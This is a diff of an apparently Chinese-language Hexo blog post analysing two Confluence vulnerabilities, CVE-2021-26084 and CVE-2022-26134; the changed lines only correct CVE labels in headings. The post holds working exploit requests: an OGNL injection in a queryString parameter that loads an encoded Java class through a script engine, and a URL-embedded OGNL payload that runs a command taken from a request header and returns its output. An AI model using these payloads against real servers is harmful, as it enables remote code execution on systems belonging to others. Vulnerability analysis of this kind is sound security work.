@@ -5,7 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="Confluence(CVE-2021-26084&amp;CVE-2022-26134), Hexo">
-    <meta name="description" content="Confluence(CVE-2022-26134)本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。
+    <meta name="description" content="Confluence(CVE-2021-26084)本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。
 21的这个洞感觉有点像模板注入。confluence处理velocity模板，将velocity语法转为字">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -477,7 +477,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Confluence-CVE-2022-26134"><a href="#Confluence-CVE-2022-26134" class="headerlink" title="Confluence(CVE-2022-26134)"></a>Confluence(CVE-2022-26134)</h2><p>本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。</p>
+                <h2 id="Confluence-CVE-2021-26084"><a href="#Confluence-CVE-2021-26084" class="headerlink" title="Confluence(CVE-2021-26084)"></a>Confluence(CVE-2021-26084)</h2><p>本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。</p>
 <p>21的这个洞感觉有点像模板注入。confluence处理velocity模板，将velocity语法转为字符串输出到页面，其中涉及到的一些表达式计算会调用<code>ognl.getValue()</code>处理。confluence处理vm文件，首先将vm内容转为AST语法树，然后分别处理每一个节点的内容，将每个节点的内容拼接输出。而我们构造的payload中的queryString就是其中一个节点。</p>
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre class="language-none"><code class="language-none">POST &#x2F;pages&#x2F;createpage-entervariables.action HTTP&#x2F;1.1
 Host: ty.com:8090
@@ -521,7 +521,7 @@ Content-Length: 1960
 
 queryString&#x3D;\u0027%2bClass.forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022try &#123;load(\u0027nashorn:mozilla_compat.js\u0027); &#125; catch (e) &#123;&#125; importPackage(Packages.java.util);importPackage(Packages.java.lang); importPackage(Packages.java.io); function Base64DecodeToByte(str) &#123;importPackage(Packages.sun.misc);importPackage(Packages.java.util);var bt;try &#123; bt &#x3D; new BASE64Decoder().decodeBuffer(str);&#125; catch (e) &#123;bt &#x3D; new Base64().getDecoder().decode(str);&#125;return bt;&#125; function define(Classdata) &#123;var classBytes &#x3D; Base64DecodeToByte(Classdata);var byteArray &#x3D; Java.type(\u0027byte[]\u0027);var int &#x3D; Java.type(\u0027int\u0027);var defineClassMethod &#x3D; java.lang.ClassLoader.class.getDeclaredMethod(\u0027defineClass\u0027,byteArray.class,int.class,int.class);defineClassMethod.setAccessible(true);var cc &#x3D; defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(),classBytes,0,classBytes.length);return cc.getConstructor().newInstance(); &#125; define(\u0027yv66vgAA..\u0027);\u0022)%2b\u0027</code></pre>
 
-<h2 id="Confluence-CVE-2022-26134-1"><a href="#Confluence-CVE-2022-26134-1" class="headerlink" title="Confluence(CVE-2022-26134)"></a>Confluence(CVE-2022-26134)</h2><p>这个洞可以分成两部分去看，一个是7.15版本以前的原始版，另一个是7.15版本以后的沙箱版。但无论哪个版本，漏洞的成因都是相同的。</p>
+<h2 id="Confluence-CVE-2022-26134"><a href="#Confluence-CVE-2022-26134" class="headerlink" title="Confluence(CVE-2022-26134)"></a>Confluence(CVE-2022-26134)</h2><p>这个洞可以分成两部分去看，一个是7.15版本以前的原始版，另一个是7.15版本以后的沙箱版。但无论哪个版本，漏洞的成因都是相同的。</p>
 <h3 id="回显POC-1"><a href="#回显POC-1" class="headerlink" title="回显POC"></a>回显POC</h3><pre class="language-none"><code class="language-none">POST 	&#x2F;%24%7BClass.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;%2Corg.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;))%3B%22)%7D&#x2F; HTTP&#x2F;1.1
 Host: localhost:8091
 cmd: whoami
